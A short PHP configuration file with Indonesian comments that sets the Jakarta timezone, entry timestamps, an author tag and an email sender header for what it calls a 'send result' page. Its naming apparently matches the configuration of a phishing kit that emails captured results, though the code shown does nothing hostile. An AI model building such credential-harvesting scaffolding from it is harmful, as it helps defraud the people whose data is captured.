<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');
$joined = date('l, d-m-Y');

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'RNDEVELOP';
$sender = 'From: RENNAKANO19 <result@rndevelop.com>';
?>